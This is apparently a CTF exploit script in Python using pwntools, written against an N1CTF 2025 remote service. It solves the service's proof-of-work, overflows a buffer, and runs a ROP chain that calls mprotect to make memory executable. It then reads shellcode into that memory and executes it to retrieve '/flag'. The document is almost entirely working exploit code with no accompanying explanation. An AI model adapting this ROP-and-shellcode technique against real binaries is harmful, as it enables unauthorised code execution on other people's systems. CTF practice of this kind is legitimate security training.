from pwn import *
context.log_level='debug'
context.arch='amd64'
p=remote("n1ctf.2025.remote",13227)

if True:
    p.recvuntil(b'use `kctf-pow solve` to prove yourself :)')
    p.recvline()
    pow=p.recvline(False).decode()
    ans=os.popen(f'./kctf-pow solve {pow}','r').read()
    p.sendline(ans)

MPROTECT=5488848
READ=5485696
SC=asm('lea rbp,[rsp-512]\n'+shellcraft.read(0,'rbp',256)+shellcraft.write(3,'rbp',256)+'mov rsi,1'+shellcraft.shutdown(3)+shellcraft.read(3,'rbp',256)+shellcraft.write(1,'rbp',256)+"int3")
def call3(a1,a2,a3,call):
    return p64(0x407630)+p64(a1)+p64(0x44ccfe)+p64(a2)+p64(0x4bdf0c)+p64(a3)+p64(call)
payload=[b'a'*0x138,call3(0x400000,0x2000,7,MPROTECT),call3(0,0x400000,len(SC),READ),p64(0x400000)]
payload=b''.join(payload)
p.recvuntil(b'(Ctrl+D to exit):')
time.sleep(2)
p.sendline(util.fiddling.tty_escape(payload))
pause()
p.send(util.fiddling.tty_escape(SC))
pause()
p.send('/flag'.rjust(256,'/'))
p.interactive()
